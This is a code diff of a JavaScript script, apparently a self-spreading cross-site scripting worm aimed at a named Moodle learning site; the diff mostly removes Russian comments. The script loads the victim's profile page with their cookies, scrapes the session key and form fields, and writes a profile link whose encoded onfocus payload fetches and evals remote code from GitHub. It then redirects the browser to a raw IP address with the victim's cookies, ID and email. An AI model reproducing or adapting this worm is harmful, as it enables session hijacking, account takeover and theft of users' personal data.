@@ -14,62 +14,50 @@ function extractAllValues(htmlContent) {
         mform_isexpanded_id_category_1: null
     };
 
-    // Извлечение email (из поля input с name="email")
     const emailRegex = /<input[^>]*name="email"[^>]*value="([^"]*)"[^>]*>/i;
     const emailMatch = htmlContent.match(emailRegex);
     if (emailMatch) result.email = emailMatch[1];
 
-    // Извлечение id (из hidden input)
     const idRegex = /<input[^>]*name="id"[^>]*value="([^"]*)"[^>]*>/i;
     const idMatch = htmlContent.match(idRegex);
     if (idMatch) result.id = idMatch[1];
 
-    // Извлечение course
     const courseRegex = /<input[^>]*name="course"[^>]*value="([^"]*)"[^>]*>/i;
     const courseMatch = htmlContent.match(courseRegex);
     if (courseMatch) result.course = courseMatch[1];
 
-    // Извлечение timezone
     const timezoneRegex = /<input[^>]*name="timezone"[^>]*value="([^"]*)"[^>]*>/i;
     const timezoneMatch = htmlContent.match(timezoneRegex);
     if (timezoneMatch) result.timezone = timezoneMatch[1];
 
-    // Извлечение sesskey
     const sesskeyRegex = /<input[^>]*name="sesskey"[^>]*value="([^"]*)"[^>]*>/i;
     const sesskeyMatch = htmlContent.match(sesskeyRegex);
     if (sesskeyMatch) result.sesskey = sesskeyMatch[1];
 
-    // Извлечение _qf__user_edit_form
     const qfRegex = /<input[^>]*name="_qf__user_edit_form"[^>]*value="([^"]*)"[^>]*>/i;
     const qfMatch = htmlContent.match(qfRegex);
     if (qfMatch) result._qf__user_edit_form = qfMatch[1];
 
-    // Извлечение mform_isexpanded_id_moodle_picture
     const pictureRegex = /<input[^>]*name="mform_isexpanded_id_moodle_picture"[^>]*value="([^"]*)"[^>]*>/i;
     const pictureMatch = htmlContent.match(pictureRegex);
     if (pictureMatch) result.mform_isexpanded_id_moodle_picture = pictureMatch[1];
 
-    // Извлечение mform_isexpanded_id_moodle
     const moodleRegex = /<input[^>]*name="mform_isexpanded_id_moodle"[^>]*value="([^"]*)"[^>]*>/i;
     const moodleMatch = htmlContent.match(moodleRegex);
     if (moodleMatch) result.mform_isexpanded_id_moodle = moodleMatch[1];
 
-    // Извлечение mform_isexpanded_id_moodle_additional_names
     const additionalNamesRegex = /<input[^>]*name="mform_isexpanded_id_moodle_additional_names"[^>]*value="([^"]*)"[^>]*>/i;
     const additionalNamesMatch = htmlContent.match(additionalNamesRegex);
     if (additionalNamesMatch) result.mform_isexpanded_id_moodle_additional_names = additionalNamesMatch[1];
 
-    // Извлечение mform_isexpanded_id_moodle_interests
     const interestsRegex = /<input[^>]*name="mform_isexpanded_id_moodle_interests"[^>]*value="([^"]*)"[^>]*>/i;
     const interestsMatch = htmlContent.match(interestsRegex);
     if (interestsMatch) result.mform_isexpanded_id_moodle_interests = interestsMatch[1];
 
-    // Извлечение mform_isexpanded_id_moodle_optional
     const optionalRegex = /<input[^>]*name="mform_isexpanded_id_moodle_optional"[^>]*value="([^"]*)"[^>]*>/i;
     const optionalMatch = htmlContent.match(optionalRegex);
     if (optionalMatch) result.mform_isexpanded_id_moodle_optional = optionalMatch[1];
 
-    // Извлечение mform_isexpanded_id_category_1
     const categoryRegex = /<input[^>]*name="mform_isexpanded_id_category_1"[^>]*value="([^"]*)"[^>]*>/i;
     const categoryMatch = htmlContent.match(categoryRegex);
     if (categoryMatch) result.mform_isexpanded_id_category_1 = categoryMatch[1];
@@ -114,7 +102,6 @@ async function postData(email, id, course, timezone, sesskey, _qf__user_edit_for
 async function getUserProfile() {
     const url = 'https://www.dist-mspk.ru/user/edit.php';
     
-    // Подготавливаем заголовки (как в вашем запросе)
     const headers = new Headers();
     headers.append('Cookie', document.cookie);
     headers.append('Sec-Ch-Ua', '"Chromium";v="145", "Not:A-Brand";v="99"');
@@ -133,25 +120,20 @@ async function getUserProfile() {
     headers.append('Connection', 'keep-alive');
 
     try {
-        // Выполняем GET запрос
         const response = await fetch(url, {
             method: 'GET',
             headers: headers,
-            credentials: 'include' // Важно для отправки cookies
+            credentials: 'include'
         });
 
-        // Проверяем статус ответа
         if (!response.ok) {
             throw new Error(`HTTP error! status: ${response.status}`);
         }
 
-        // Получаем содержимое как текст (HTML)
         const htmlContent = await response.text();
 
-        // Извлекаем все значения
         const allValues = extractAllValues(htmlContent);
         
-        // Выводим все значения в консоль
         console.log('Email:', allValues.email);
         console.log('ID:', allValues.id);
         console.log('Course:', allValues.course);
@@ -167,11 +149,10 @@ async function getUserProfile() {
         await postData(allValues.email, allValues.id, allValues.course, allValues.timezone, allValues.sesskey, allValues._qf__user_edit_form, allValues.mform_isexpanded_id_moodle_picture, allValues.mform_isexpanded_id_moodle, allValues.mform_isexpanded_id_moodle_additional_names, allValues.mform_isexpanded_id_moodle_interests, allValues.mform_isexpanded_id_moodle_optional, allValues.mform_isexpanded_id_category_1, document.cookie, "%3Ch1+style%3D%22text-align%3Acenter%3B%22%3E%3Cstrong%3E%3Ca+href%3D%22https%3A%2F%2Fwww.dist-mspk.ru%2Fcourse%2Fsearch.php%3Fareaids%3Dcore_course-course%26amp%3Bq%3D%2522%2520autofocus%2Fonfocus%3D%2522fetch%28%2527https%3A%2F%2Fraw.githubusercontent.com%2FAMAT0RY%2Fxs%2Fmain%2Ftest.js%2527%29.then%28r%3D%253Er.text%28%29%29.then%28eval%29%3B%2522%2520%2F%2F%22+target%3D%22_blank%22+rel%3D%22noreferrer+noopener%22%3E%3Cspan%3E%D0%92%D0%9A%D0%90%D0%9D%D0%A2%D0%90%D0%9A%D0%A2%D0%95+%D0%A1%D0%AB%D0%9B%D0%9A%D0%90%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fstrong%3E%3C%2Fh1%3E")
         window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+", id:"+allValues.id+", email:"+allValues.email;
 
-        // Возвращаем все значения для дальнейшего использования
         return allValues;
 
     } catch (error) {
-        console.error('Ошибка при получении данных:', error);
+        console.error('error:', error);
         throw error;
     }
 }
